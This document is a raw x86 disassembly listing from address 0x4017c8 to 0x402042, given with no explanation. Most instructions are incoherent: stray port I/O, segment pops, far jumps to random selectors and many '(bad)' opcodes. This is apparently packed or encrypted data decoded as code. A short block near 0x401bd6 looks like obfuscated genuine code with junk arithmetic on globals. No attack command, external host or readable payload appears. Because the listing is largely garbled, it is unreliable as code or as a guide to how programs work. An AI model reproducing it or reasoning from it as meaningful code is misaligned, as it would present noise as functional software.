  4017c8:	mov    dh,bl
  4017ca:	or     edx,DWORD PTR [eax+0x5d1fbce]
  4017d0:	in     al,0x62
  4017d2:	push   0xea3256c
  4017d7:	pop    ds
  4017d8:	pop    es
  4017d9:	mov    ebp,0x54b7973e
  4017de:	jg     0x401809
  4017e0:	inc    ebx
  4017e1:	aam    0x7b
  4017e3:	xor    DWORD PTR [ecx],ebp
  4017e5:	pushf  
  4017e6:	push   ds
  4017e7:	xchg   ebx,eax
  4017e8:	cmp    DWORD PTR [ebx-0x498c5ea4],0x6428c231
  4017f2:	data16 loope 0x4017b7
  4017f5:	mov    esp,0xe298879f
  4017fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017fc:	fnstsw WORD PTR [ebx-0x42226f88]
  401802:	add    bl,bh
  401804:	cmp    edx,DWORD PTR [ecx+0x29]
  401807:	in     eax,0x2c
  401809:	jns    0x401820
  40180b:	cld    
  40180c:	out    dx,eax
  40180d:	xor    ebx,DWORD PTR [eax+0x4a8e9bca]
  401813:	or     al,0x3e
  401815:	inc    ecx
  401816:	dec    edx
  401817:	rol    DWORD PTR [ecx],1
  401819:	add    eax,0xbad885cc
  40181e:	adc    al,0x34
  401820:	push   ebp
  401821:	dec    ecx
  401822:	sub    al,0x3f
  401824:	xor    dl,dl
  401826:	xor    cl,BYTE PTR [ebx]
  401828:	mov    ah,bh
  40182a:	inc    ebx
  40182b:	jge    0x401871
  40182d:	sti    
  40182e:	mov    esp,0xefe0a1a0
  401833:	add    edx,ebx
  401835:	iret   
  401836:	inc    edx
  401837:	add    esp,DWORD PTR [edi+0x27d058b6]
  40183d:	add    DWORD PTR [esi-0x54],edx
  401840:	jb     0x40188a
  401842:	and    DWORD PTR ds:[edi-0x5f5f0d92],esp
  401849:	repz inc esi
  40184b:	xchg   ecx,eax
  40184c:	mov    bh,BYTE PTR [edi+eiz*2+0x20afd92f]
  401853:	sub    esp,ecx
  401855:	inc    eax
  401856:	out    dx,al
  401857:	mov    edi,DWORD PTR [eax-0x42ddb069]
  40185d:	and    esp,eax
  40185f:	in     eax,dx
  401860:	pop    ebx
  401861:	ficom  DWORD PTR [eax-0x74]
  401864:	jbe    0x4018c1
  401866:	in     eax,0x86
  401868:	jl     0x40184c
  40186a:	inc    esi
  40186b:	retf   0x58e4
  40186e:	mov    esp,0xfd23af41
  401873:	add    DWORD PTR ds:[ebp-0xc],esp
  401877:	les    edx,FWORD PTR [ebp+ebx*4-0x1d]
  40187b:	mov    edx,0xc54059ef
  401880:	push   ecx
  401881:	jge    0x40183d
  401883:	inc    esi
  401884:	fidivr WORD PTR [edi+0x64cfb5f4]
  40188a:	and    DWORD PTR [edx-0x5e],edx
  40188d:	(bad)  [edi]
  40188f:	call   0x208f:0x6b339b2f
  401896:	mov    al,ds:0x1de1540a
  40189b:	jl     0x401856
  40189d:	in     eax,0x5d
  40189f:	mov    al,0x86
  4018a1:	xchg   esp,eax
  4018a2:	cwde   
  4018a3:	fwait
  4018a4:	test   al,0xab
  4018a6:	push   ecx
  4018a7:	cmp    al,0x2c
  4018a9:	jno    0x401917
  4018ab:	out    0x54,eax
  4018ad:	adc    DWORD PTR ss:[ebp-0x5e],ebx
  4018b1:	cmp    eax,0xa8ea65f5
  4018b6:	bound  esp,QWORD PTR ss:[ebp-0x41]
  4018ba:	xstore-rng (bad)
  4018bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018bc:	push   es
  4018bd:	(bad)  ds:0x24291421
  4018c3:	sbb    esi,DWORD PTR [edi-0x59]
  4018c6:	inc    edx
  4018c7:	ror    DWORD PTR [ebp-0x13731734],1
  4018cd:	stc    
  4018ce:	and    al,0x8b
  4018d0:	cmp    BYTE PTR [edx+0xc49a434],0xbc
  4018d7:	lahf   
  4018d8:	dec    esi
  4018d9:	push   edi
  4018da:	xchg   esp,eax
  4018db:	mov    eax,0xe630f77c
  4018e0:	pushfw 
  4018e2:	test   DWORD PTR [esi],edi
  4018e4:	or     al,0xfa
  4018e6:	xor    al,0x66
  4018e8:	sub    eax,0x271065f3
  4018ed:	mov    ecx,0x5c349f31
  4018f2:	enter  0x54e5,0x77
  4018f6:	xchg   ebp,eax
  4018f7:	pop    ss
  4018f8:	push   ecx
  4018f9:	sahf   
  4018fa:	pop    edx
  4018fb:	cdq    
  4018fc:	sbb    al,0x5
  4018fe:	jo     0x40188e
  401900:	mov    esp,0x6b48c290
  401905:	ffreep st(2)
  401907:	mov    eax,0xd3df9c08
  40190c:	jg     0x4018b0
  40190e:	jae    0x4018e5
  401910:	aas    
  401911:	sub    eax,DWORD PTR [ebx+0x51]
  401914:	push   ebx
  401915:	dec    ebx
  401916:	adc    al,BYTE PTR [eax+0x6e8e0574]
  40191c:	std    
  40191d:	or     ecx,DWORD PTR [ebp+0x2716e96f]
  401923:	mov    edi,0x9750aad8
  401928:	fild   QWORD PTR [eax]
  40192a:	mov    ebx,0x19a44538
  40192f:	adc    al,0x14
  401931:	jl     0x401909
  401933:	inc    ebx
  401934:	and    DWORD PTR [ecx-0x47525495],edx
  40193a:	ret    
  40193b:	rol    BYTE PTR [ecx+0x47],cl
  40193e:	test   BYTE PTR [ecx-0x5f24e526],bl
  401944:	sbb    ebx,eax
  401946:	mov    edi,0x4db24773
  40194b:	jge    0x4019bc
  40194d:	jbe    0x401956
  40194f:	gs push ss
  401951:	mov    ds:0x68ecf630,eax
  401956:	mov    esp,0x48b06475
  40195b:	push   esi
  40195c:	xor    eax,DWORD PTR [edx-0x77fb2fa1]
  401962:	mov    eax,0xcb122668
  401967:	ds or  eax,eax
  40196a:	stos   BYTE PTR es:[edi],al
  40196b:	test   DWORD PTR [eax+0x4b],eax
  40196e:	mov    esp,0x649c67e0
  401973:	das    
  401974:	loopne 0x4019b1
  401976:	stc    
  401977:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401978:	imul   DWORD PTR [esi+0x1a]
  40197b:	and    eax,0xd5f79376
  401980:	cli    
  401981:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401982:	cmp    DWORD PTR [eax],ebx
  401984:	or     DWORD PTR [edi],esi
  401986:	into   
  401987:	mov    edx,0x4aa2b72c
  40198c:	lods   al,BYTE PTR ds:[esi]
  40198d:	stc    
  40198e:	es mov ebx,0x817f4e1
  401994:	push   esp
  401995:	out    0x8d,al
  401997:	jecxz  0x40195a
  401999:	aas    
  40199a:	leave  
  40199b:	xchg   esp,eax
  40199c:	adc    al,0x54
  40199e:	clc    
  40199f:	jp     0x40194d
  4019a1:	imul   DWORD PTR [ebx-0x54]
  4019a4:	dec    edi
  4019a5:	and    al,0xb8
  4019a7:	cmc    
  4019a8:	jecxz  0x4019ae
  4019aa:	je     0x4019f0
  4019ac:	arpl   WORD PTR [eax],sp
  4019ae:	or     al,0x55
  4019b0:	jp     0x40195e
  4019b2:	clc    
  4019b3:	mov    ds:0xd8e4a6d6,eax
  4019b8:	int3   
  4019b9:	mov    esi,0x33fa162c
  4019be:	ins    DWORD PTR es:[edi],dx
  4019bf:	repz int 0x4f
  4019c2:	std    
  4019c3:	mov    ah,0x7a
  4019c5:	call   0x94c9b69c
  4019ca:	xor    DWORD PTR [ecx+0x1cd3c235],0xffffffb7
  4019d1:	lods   al,BYTE PTR ds:[esi]
  4019d2:	repz ror BYTE PTR [ecx],1
  4019d5:	mov    bl,0xfa
  4019d7:	(bad)
  4019db:	pop    es
  4019dc:	push   ecx
  4019dd:	sti    
  4019de:	cmp    BYTE PTR [ecx+0x464ec9b3],dh
  4019e4:	mov    bh,0x25
  4019e6:	shl    DWORD PTR [ecx],cl
  4019e8:	add    eax,0x173c0e21
  4019ed:	test   al,0x8e
  4019ef:	add    BYTE PTR [ebx-0x6463cbe7],dl
  4019f5:	and    bl,ch
  4019f7:	test   eax,0x9de3961b
  4019fc:	jle    0x4019e5
  4019fe:	inc    ecx
  4019ff:	ss jmp 0x401a77
  401a02:	dec    edi
  401a03:	leave  
  401a04:	in     al,0x47
  401a06:	xchg   DWORD PTR [esi+0x79751e93],esp
  401a0c:	cmp    DWORD PTR [edx],eax
  401a0e:	inc    ebx
  401a0f:	imul   eax,DWORD PTR [ecx],0xffffffbf
  401a12:	mov    ah,0x23
  401a14:	loope  0x401a7d
  401a16:	dec    ebp
  401a17:	stos   DWORD PTR es:[edi],eax
  401a18:	(bad)  
  401a19:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a1b:	sbb    eax,0xa6f5551e
  401a20:	aaa    
  401a21:	adc    dh,BYTE PTR [ecx+edx*2+0x75]
  401a25:	xor    BYTE PTR [edx-0x43c87fbe],cl
  401a2b:	cmp    DWORD PTR [edi],esp
  401a2d:	pop    ds
  401a2e:	push   edi
  401a2f:	dec    ebx
  401a30:	push   cs
  401a31:	mov    ebx,0x6d7ff43a
  401a36:	xor    al,0xe2
  401a38:	xchg   bh,cl
  401a3a:	(bad)  
  401a3b:	mov    ds:0x9ce905e4,eax
  401a40:	inc    esp
  401a41:	mov    eax,ds:0xa3d891b9
  401a46:	adc    dh,BYTE PTR [edx+0x6b]
  401a49:	int3   
  401a4a:	fstp   TBYTE PTR [eax+ecx*8-0x6c5b2ddb]
  401a51:	retf   
  401a52:	mov    ch,0x7
  401a54:	push   ebx
  401a55:	or     edi,0x78
  401a58:	jle    0x401a18
  401a5a:	push   ebx
  401a5b:	les    edi,FWORD PTR [edx]
  401a5d:	sub    bl,BYTE PTR [edi+0x21]
  401a60:	jmp    0x401a77
  401a62:	neg    BYTE PTR [edx+0x13]
  401a65:	mov    edx,0xa107b34f
  401a6a:	push   ebp
  401a6b:	jp     0x401a85
  401a6d:	rol    DWORD PTR [eax-0x4d299b2b],cl
  401a73:	mov    eax,0xde86fed1
  401a78:	or     eax,0x475fdae9
  401a7d:	pop    esi
  401a7e:	not    edi
  401a80:	cld    
  401a81:	xor    BYTE PTR [ebx+edi*2],bh
  401a84:	inc    eax
  401a85:	push   edx
  401a86:	pop    ebp
  401a87:	inc    DWORD PTR [ebx+0x5a8f3914]
  401a8d:	jnp    0x401a3a
  401a8f:	out    dx,eax
  401a90:	mov    cl,0x4a
  401a92:	xor    cl,BYTE PTR [ecx-0x7a]
  401a95:	adc    ebx,DWORD PTR [ebp-0x14ef687a]
  401a9b:	dec    ebp
  401a9c:	jae    0x401aa6
  401a9e:	xchg   edx,eax
  401a9f:	jae    0x401ac3
  401aa1:	(bad)  
  401aa2:	cmp    eax,edx
  401aa4:	ja     0x401aeb
  401aa6:	add    al,0xf4
  401aa8:	icebp  
  401aa9:	mov    cl,0xe9
  401aab:	jmp    0x401ab6
  401aad:	iret   
  401aae:	retf   
  401aaf:	into   
  401ab0:	jmp    0x2e696e57
  401ab5:	sub    eax,0xc5254147
  401aba:	push   es
  401abb:	loope  0x401b27
  401abd:	ret    
  401abe:	outs   dx,BYTE PTR ds:[esi]
  401abf:	icebp  
  401ac0:	dec    edx
  401ac1:	adc    ch,bl
  401ac3:	cmp    ah,BYTE PTR [eax-0x6]
  401ac6:	mov    al,dl
  401ac8:	push   ds
  401ac9:	jae    0x401ad1
  401acb:	inc    esp
  401acc:	cwde   
  401acd:	jle    0x401b03
  401acf:	mov    dl,0x55
  401ad1:	mov    DWORD PTR [esi],ecx
  401ad3:	pop    ebx
  401ad4:	jb     0x401ae4
  401ad6:	mov    ch,BYTE PTR [ebx]
  401ad8:	pop    eax
  401ad9:	popa   
  401ada:	std    
  401adb:	test   BYTE PTR [ebx+0x2f],dl
  401ade:	fs cs jecxz 0x401a85
  401ae2:	fucomp st(5)
  401ae4:	jmp    0x9161:0x5a9cfa51
  401aeb:	imul   edi,esi,0xb9c6d89b
  401af1:	loop   0x401ae2
  401af3:	fcomp  DWORD PTR [edx-0x59f583d7]
  401af9:	pop    edi
  401afa:	xchg   ebx,eax
  401afb:	ret    
  401afc:	test   eax,0xd2ed6ee
  401b01:	shl    DWORD PTR [eax],1
  401b03:	sub    cl,al
  401b05:	in     al,0xc2
  401b07:	cmp    eax,0xff872272
  401b0c:	jp     0x401ab3
  401b0e:	ja     0x401aca
  401b10:	sub    DWORD PTR [ebp-0x44da5701],0x57
  401b17:	das    
  401b18:	mov    ds:0x98afab7a,al
  401b1d:	jne    0x401b55
  401b1f:	data16 test BYTE PTR [ebx+0x3b7d5287],bh
  401b26:	dec    ecx
  401b27:	leave  
  401b28:	sbb    edx,DWORD PTR [eax+ebx*4]
  401b2b:	pop    ds
  401b2c:	inc    ebp
  401b2d:	ret    
  401b2e:	jle    0x401b32
  401b30:	pop    edx
  401b31:	mov    al,ds:0x15acb57c
  401b36:	sbb    BYTE PTR [ebx+0x7c],al
  401b39:	popf   
  401b3a:	jne    0x401acf
  401b3c:	jb     0x401afa
  401b3e:	mov    fs,ebx
  401b40:	outs   dx,BYTE PTR ds:[esi]
  401b41:	das    
  401b42:	sub    BYTE PTR [edi+edi*4],bl
  401b45:	jo     0x401b31
  401b47:	sbb    DWORD PTR [ebp-0x64],0xfe540cae
  401b4e:	sti    
  401b4f:	bound  esp,QWORD PTR [eax]
  401b51:	call   0x138ff28a
  401b56:	sbb    al,0x1
  401b58:	gs cli 
  401b5a:	gs adc eax,0x86324efd
  401b60:	dec    edx
  401b61:	je     0x401b4b
  401b63:	or     eax,0xac5459e8
  401b68:	push   ds
  401b69:	mov    ds:0xfe00dfad,eax
  401b6e:	nop
  401b6f:	bound  ecx,QWORD PTR [eax+0x11e4c2f5]
  401b75:	xor    ebx,DWORD PTR [ecx+0x4c257933]
  401b7b:	adc    DWORD PTR [esi+0x1af8b25b],ebp
  401b81:	ins    BYTE PTR es:[edi],dx
  401b82:	cld    
  401b83:	cmp    eax,0x2a10f18f
  401b88:	inc    ecx
  401b89:	cmp    al,0x7a
  401b8b:	ret    0x3c17
  401b8e:	mov    ds:0xb9c8ac6b,al
  401b93:	addr16 ret 
  401b95:	push   ss
  401b96:	ds xor eax,0x6e01bfaa
  401b9c:	aam    0x7a
  401b9e:	jecxz  0x401b3c
  401ba0:	dec    esp
  401ba1:	mov    ds:0x72af4363,al
  401ba6:	(bad)  
  401ba7:	fidivr WORD PTR [eax]
  401ba9:	aaa    
  401baa:	iret   
  401bab:	clc    
  401bac:	sbb    al,0x16
  401bae:	scas   eax,DWORD PTR es:[edi]
  401baf:	fsubr  QWORD PTR [ebp+0x38]
  401bb2:	sbb    DWORD PTR ds:0xb7a99c2d,0xdda8e3a3
  401bbc:	push   edx
  401bbd:	adc    bl,BYTE PTR [ecx]
  401bbf:	mov    eax,0x47ee6a4e
  401bc4:	mov    ch,0xe5
  401bc6:	ins    BYTE PTR es:[edi],dx
  401bc7:	jmp    0x6612:0x160ebf50
  401bce:	dec    edx
  401bcf:	pop    ecx
  401bd0:	les    ecx,FWORD PTR [edi-0x63]
  401bd3:	and    edi,esi
  401bd5:	pop    ds
  401bd6:	mov    ecx,DWORD PTR [ebp+0x1c]
  401bd9:	shrd   eax,ecx,0x2
  401bdd:	shr    ecx,0x2
  401be0:	not    edx
  401be2:	mov    ecx,DWORD PTR [ebp+0x18]
  401be5:	dec    edx
  401be6:	mov    edx,DWORD PTR [ebp+0x1c]
  401be9:	xor    eax,edi
  401beb:	adc    DWORD PTR ds:0x42297e,0x4229a2
  401bf5:	xor    edx,edx
  401bf7:	mov    DWORD PTR ds:0x4229ae,0x6bb3
  401c01:	or     edx,eax
  401c03:	adc    DWORD PTR ds:0x422986,0x42289e
  401c0d:	mov    DWORD PTR [ebp-0x3c],edx
  401c10:	neg    eax
  401c12:	mov    DWORD PTR [ebp-0x70],0x2c55
  401c19:	mov    DWORD PTR [ebp-0x6c],0x456f
  401c20:	cmp    DWORD PTR ds:0x4229d2,0x0
  401c27:	mov    DWORD PTR ds:0x42289e,0x7b64
  401c31:	mov    DWORD PTR ds:0x42292a,0x2f7e
  401c3b:	mov    DWORD PTR ds:0x42289a,0x21f
  401c45:	mov    DWORD PTR ds:0x4229ce,0x3163
  401c4f:	jmp    0x401cb0
  401c54:	mov    DWORD PTR ds:0x4228ae,0x1734
  401c5e:	mov    eax,0x7b34
  401c63:	je     0x401c91
  401c69:	push   0x771c
  401c6e:	push   DWORD PTR [ebp-0x18]
  401c71:	call   DWORD PTR ds:0x42a040
  401c77:	and    DWORD PTR ds:0x422996,0x7212
  401c81:	sub    DWORD PTR ds:0x42297e,0x15ec
  401c8b:	and    DWORD PTR ds:0x42290e,ebx
  401c91:	or     DWORD PTR ds:0x42298a,0x1787
  401c9b:	xor    DWORD PTR ds:0x4229aa,0x7558
  401ca5:	mov    eax,ds:0x4228f6
  401caa:	sub    DWORD PTR ds:0x4228fa,eax
  401cb0:	mov    DWORD PTR [ebp-0x70],0x78a6
  401cb7:	movzx  eax,BYTE PTR ds:0x4229a2
  401cbe:	or     DWORD PTR ds:0x4228fe,eax
  401cc4:	jmp    0x40224e
  401cc9:	in     eax,dx
  401cca:	in     al,dx
  401ccb:	test   DWORD PTR [edi+esi*8-0x219a9b7c],0x696e8adf
  401cd6:	sbb    DWORD PTR [esi],ebp
  401cd8:	push   0x1616fa6a
  401cdd:	cmp    eax,0x8a161604
  401ce2:	push   ecx
  401ce3:	test   eax,0x3d5e521e
  401ce8:	aam    0x8a
  401cea:	jecxz  0x401d3e
  401cec:	adc    DWORD PTR [edi-0x36],edx
  401cef:	jnp    0x401ccd
  401cf1:	xchg   ebx,eax
  401cf2:	ret    0xce3e
  401cf5:	mov    edi,DWORD PTR [eax+ebx*2-0x7312dc0f]
  401cfc:	(bad)  [ecx]
  401cfe:	xchg   ebp,eax
  401cff:	jecxz  0x401ca5
  401d01:	fdiv   st(1),st
  401d03:	les    ebx,FWORD PTR es:[esi+0x179e015]
  401d0a:	icebp  
  401d0b:	cs push ebp
  401d0d:	scas   eax,DWORD PTR es:[edi]
  401d0e:	sbb    al,0xfd
  401d10:	sbb    BYTE PTR [bp+di-0x5919],cl
  401d15:	inc    ebx
  401d16:	adc    DWORD PTR [esi+0x5d10ac5a],0xffffffad
  401d1d:	enter  0x3c5e,0x29
  401d21:	vcmpps xmm4,xmm6,XMMWORD PTR [ecx],0xd7
  401d26:	aas    
  401d27:	sub    eax,0x30589802
  401d2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d2d:	mov    ah,0x86
  401d2f:	idiv   BYTE PTR [edi+ebx*2+0x47]
  401d33:	jecxz  0x401cf0
  401d35:	inc    edx
  401d36:	les    esi,FWORD PTR gs:[ebx]
  401d39:	add    DWORD PTR [edi-0x2473150b],edx
  401d3f:	mov    fs,WORD PTR [edi]
  401d41:	ficom  WORD PTR [esi-0x2ecbd3be]
  401d47:	test   DWORD PTR [eax+edx*4-0x71],0xeae23591
  401d4f:	aam    0x63
  401d51:	or     DWORD PTR [esi],0xffffffd6
  401d54:	add    edi,DWORD PTR [edi+0x77]
  401d57:	in     eax,0x6a
  401d59:	xchg   edi,eax
  401d5a:	scas   eax,DWORD PTR es:[edi]
  401d5b:	aaa    
  401d5c:	mov    esi,0x77dca6f9
  401d61:	xor    eax,0x56f372c8
  401d66:	add    al,al
  401d68:	and    ch,BYTE PTR fs:[ecx]
  401d6b:	std    
  401d6c:	mov    eax,0xdd578de
  401d71:	pop    esp
  401d72:	(bad)  
  401d74:	mov    DWORD PTR [ebp+0x25],ebx
  401d77:	es mov edx,0xa398f4e7
  401d7d:	xchg   esp,eax
  401d7e:	sahf   
  401d7f:	loop   0x401d62
  401d81:	stos   DWORD PTR es:[edi],eax
  401d82:	lahf   
  401d83:	push   esp
  401d84:	fwait
  401d85:	jecxz  0x401df2
  401d87:	in     eax,dx
  401d88:	call   0x10d4:0x8990e0b4
  401d8f:	jmp    0x401de0
  401d91:	mov    al,0x2
  401d93:	sbb    al,0xbf
  401d95:	mov    ebp,0xbfc47a7d
  401d9a:	push   ss
  401d9b:	and    BYTE PTR [edx+0x30],bl
  401d9e:	cmp    eax,0x8af3b769
  401da3:	call   0xb949:0xc2fc20dc
  401daa:	cmp    al,0x28
  401dac:	pop    esi
  401dad:	int    0x95
  401daf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401db0:	sahf   
  401db1:	fsubr  DWORD PTR [eax-0x70b9525c]
  401db7:	sbb    al,0x10
  401db9:	inc    esp
  401dba:	pop    ebp
  401dbb:	add    dl,BYTE PTR [ecx-0x31]
  401dbe:	scas   eax,DWORD PTR es:[edi]
  401dbf:	mov    ecx,0x328441bc
  401dc4:	aam    0x1
  401dc6:	xchg   edx,eax
  401dc7:	retf   0xe4c1
  401dca:	(bad)  
  401dcb:	sti    
  401dcc:	jp     0x401d6a
  401dce:	pop    ds
  401dcf:	jge    0x401d5d
  401dd1:	jl     0x401d7d
  401dd3:	add    cl,dl
  401dd5:	add    al,0x8c
  401dd8:	push   ds
  401dd9:	pop    esi
  401dda:	fwait
  401ddb:	xchg   BYTE PTR ds:0x1e2b9b11,bh
  401de1:	xor    eax,0x4be4a335
  401de6:	and    eax,0x38e32e3a
  401deb:	sbb    al,0x76
  401ded:	in     al,0x48
  401def:	push   0xfffffffa
  401df1:	sbb    DWORD PTR [edx-0x799e3750],ebp
  401df7:	sbb    DWORD PTR [ebx+0x35ecce6b],ebx
  401dfd:	fcomip st,st(7)
  401dff:	push   edx
  401e00:	outs   dx,BYTE PTR ds:[esi]
  401e01:	and    edx,DWORD PTR [edx+0x265c03ab]
  401e07:	pop    edx
  401e08:	je     0x401dd3
  401e0a:	sub    al,0x57
  401e0c:	push   0x434350ef
  401e11:	push   ebx
  401e12:	dec    ebx
  401e13:	mov    bl,0x32
  401e15:	fsub   QWORD PTR [esi]
  401e17:	push   ss
  401e18:	pop    eax
  401e19:	imul   BYTE PTR [ebx-0x6e7beb08]
  401e1f:	mov    eax,ds:0xe59e1c60
  401e24:	cmp    edi,DWORD PTR [edx-0x439619dd]
  401e2a:	lea    ebp,[esi+0x2b]
  401e2d:	shl    BYTE PTR [eax-0x70f40cf4],1
  401e33:	push   es
  401e34:	ins    BYTE PTR es:[edi],dx
  401e35:	push   ds
  401e36:	icebp  
  401e37:	call   0xbd1d:0x1bc2d024
  401e3e:	ins    DWORD PTR es:[edi],dx
  401e3f:	cdq    
  401e40:	fild   QWORD PTR [ecx]
  401e42:	push   cs
  401e43:	aad    0x4e
  401e45:	pop    edx
  401e46:	adc    DWORD PTR [eax-0x34],edi
  401e49:	cmp    ecx,DWORD PTR ds:0xbf1dbc3d
  401e4f:	jge    0x401df4
  401e51:	fcomp  DWORD PTR [ebx+0x43]
  401e54:	jecxz  0x401e96
  401e56:	dec    esi
  401e57:	and    edx,DWORD PTR [ebx-0x3cd0130a]
  401e5d:	mov    WORD PTR [eax-0x3173aeda],?
  401e63:	sub    eax,0x5275067f
  401e68:	inc    edi
  401e69:	mov    WORD PTR [esi],ds
  401e6b:	sahf   
  401e6c:	jnp    0x74aa684c
  401e72:	mov    cl,0x69
  401e74:	adc    ecx,esp
  401e76:	mov    al,0x83
  401e78:	adc    BYTE PTR [ebp+0x71376363],dh
  401e7e:	or     esp,ebp
  401e80:	test   al,0xfe
  401e82:	(bad)  
  401e84:	mov    eax,0xf79dd648
  401e89:	or     BYTE PTR [esp+ebp*1],0x9c
  401e8d:	(bad)  
  401e8e:	mov    esi,0x5ce27caf
  401e93:	jno    0x401ed4
  401e95:	inc    edx
  401e96:	jmp    0xaedb:0xf9a6572
  401e9d:	jge    0x401eab
  401e9f:	xchg   ecx,eax
  401ea0:	mov    esi,0xfe4ba99d
  401ea5:	jle    0x401e8e
  401ea7:	adc    DWORD PTR [edi],0xffffffd7
  401eaa:	adc    ecx,ebx
  401eac:	jmp    0x871a398d
  401eb1:	pop    edx
  401eb2:	add    al,0xc6
  401eb4:	dec    edi
  401eb5:	cmc    
  401eb6:	(bad)  
  401eb7:	sub    ebx,DWORD PTR [ebx+0x1c]
  401eba:	jle    0x401e8b
  401ebc:	add    eax,0xfe767ec7
  401ec1:	adc    BYTE PTR [edi],dl
  401ec3:	loopne 0x401f13
  401ec5:	sbb    ecx,DWORD PTR [ebx-0x39559e93]
  401ecb:	push   ds
  401ecc:	xor    BYTE PTR [esi+0x5f23d36f],dl
  401ed2:	les    ebp,FWORD PTR [edi]
  401ed4:	test   BYTE PTR [ebx+0x5f583295],0xb5
  401edb:	adc    eax,eax
  401edd:	mov    esi,0x8a54bf5d
  401ee2:	retf   
  401ee3:	in     al,0x69
  401ee5:	jp     0x401f4e
  401ee7:	or     bl,dh
  401ee9:	leave  
  401eea:	push   cs
  401eeb:	imul   ebp,DWORD PTR [ecx+0x1186be4c],0xd5fc8f3a
  401ef5:	(bad)  
  401ef6:	hlt    
  401ef7:	out    dx,eax
  401ef8:	push   edi
  401ef9:	jge    0x401ea9
  401efb:	sub    esp,ebx
  401efd:	in     eax,0x18
  401eff:	not    bh
  401f01:	sbb    ah,0x58
  401f04:	cmp    BYTE PTR [edi+0x17],bl
  401f07:	mov    ecx,0x68a0cee
  401f0c:	scas   al,BYTE PTR es:[edi]
  401f0d:	dec    edx
  401f0e:	psubusw mm2,QWORD PTR [ebx]
  401f11:	shl    BYTE PTR [esi-0x2f64a8],cl
  401f17:	add    al,BYTE PTR [ecx+0x62]
  401f1a:	mov    ebp,0x553dc93f
  401f1f:	mov    esp,0x6714541c
  401f24:	dec    esi
  401f25:	or     BYTE PTR [ecx-0x61],bl
  401f28:	lock lods eax,DWORD PTR ds:[esi]
  401f2a:	adc    DWORD PTR ds:0xf9ed5fe7,ebx
  401f30:	inc    esi
  401f31:	mov    ds:0x36779a46,eax
  401f36:	mov    DWORD PTR [esi-0xd9e44a9],esp
  401f3c:	pop    ebp
  401f3d:	add    edi,esi
  401f3f:	push   esp
  401f40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f41:	adc    DWORD PTR [eax],ebp
  401f43:	sub    bh,BYTE PTR [esp+eiz*2-0x2e32d15]
  401f4a:	xlat   BYTE PTR ds:[ebx]
  401f4b:	jmp    0x8b65:0xa0f391b5
  401f52:	adc    ah,BYTE PTR [ecx-0x27]
  401f55:	sub    BYTE PTR [ecx+0x13],dh
  401f58:	hlt    
  401f59:	es retf 0x66c5
  401f5d:	mov    al,BYTE PTR ds:0x7784c39c
  401f63:	push   0x17
  401f65:	test   eax,0xf6e540f4
  401f6a:	sbb    cl,BYTE PTR [ecx+0x63]
  401f6d:	sub    ah,BYTE PTR ds:0xee6fccf0
  401f73:	hlt    
  401f74:	xor    ecx,DWORD PTR [edi+eax*1-0x3e]
  401f78:	push   ss
  401f79:	xchg   edi,eax
  401f7a:	mov    ecx,0x99c4ba4e
  401f7f:	fcomp  DWORD PTR [eax+edi*2]
  401f82:	repz (bad) 
  401f84:	xchg   edi,eax
  401f85:	mov    dh,0xf9
  401f87:	out    dx,al
  401f88:	mov    dh,0xf6
  401f8a:	out    dx,al
  401f8b:	push   ss
  401f8c:	in     eax,dx
  401f8d:	sub    BYTE PTR [edi-0x45],0xe1
  401f91:	jmp    0x1d38b028
  401f96:	adc    edx,esp
  401f98:	int3   
  401f99:	iret   
  401f9a:	cmp    esi,DWORD PTR [ebx+eax*2]
  401f9d:	fsin   
  401f9f:	std    
  401fa0:	inc    ebx
  401fa1:	setge  BYTE PTR [ebx-0x3c]
  401fa5:	jl     0x401fae
  401fa7:	mov    eax,0x664354fc
  401fac:	jne    0x401f31
  401fae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401faf:	pop    ecx
  401fb0:	jmp    0x401f75
  401fb2:	sub    BYTE PTR ds:0xf071a5a1,dh
  401fb8:	popf   
  401fb9:	add    dh,BYTE PTR [ebx+0x58]
  401fbc:	mov    ss,ebp
  401fbe:	xlat   BYTE PTR ds:[ebx]
  401fbf:	ss stos DWORD PTR es:[edi],eax
  401fc1:	in     al,0xad
  401fc3:	shr    BYTE PTR ss:[ecx+esi*2],0x2c
  401fc8:	cmp    al,0xc1
  401fca:	jnp    0x401fde
  401fcc:	xchg   BYTE PTR [esi],cl
  401fce:	mov    esp,0x611b2124
  401fd3:	jae    0x402042
  401fd5:	std    
  401fd6:	mov    edx,0xd89e2511
  401fdb:	ret    
  401fdc:	or     bh,ch
  401fde:	mov    al,0x51
  401fe0:	fisub  WORD PTR [ebx]
  401fe2:	int    0xaf
  401fe4:	repnz out dx,eax
  401fe6:	and    al,0x9c
  401fe8:	in     eax,dx
  401fe9:	mov    edx,0x326ae25d
  401fee:	push   ebp
  401fef:	pop    es
  401ff0:	xchg   cl,cl
  401ff2:	lods   al,BYTE PTR ds:[esi]
  401ff3:	fwait
  401ff4:	xchg   esp,eax
  401ff5:	cli    
  401ff6:	repz loopne 0x402002
  401ff9:	ds xchg esp,eax
  401ffb:	jecxz  0x402020
  401ffd:	sbb    al,0x46
  401fff:	lods   eax,DWORD PTR ds:[esi]
  402000:	mov    WORD PTR [eax+0x257c7caf],fs
  402006:	lds    ebp,FWORD PTR [ebp-0x2b45802a]
  40200c:	mov    ds:0x45445559,eax
  402011:	fldcw  WORD PTR [ecx-0x2434311d]
  402017:	mov    edi,0x59297bd6
  40201c:	add    BYTE PTR [ebp-0x62],cl
  40201f:	pop    ebx
  402020:	dec    ebx
  402021:	das    
  402022:	xchg   BYTE PTR [edi],dh
  402024:	jno    0x401fcb
  402026:	shr    DWORD PTR [esi+0x1],0x46
  40202a:	inc    ebp
  40202b:	sar    al,1
  40202d:	imul   esi,DWORD PTR [ecx+eiz*4+0x25],0x4c
  402032:	jnp    0x4020af
  402034:	nop
  402035:	das    
  402036:	ss mov edx,0x454e40fa
  40203c:	or     eax,0x8e03c424
  402041:	push   ss
  402042:	add    al,0x7
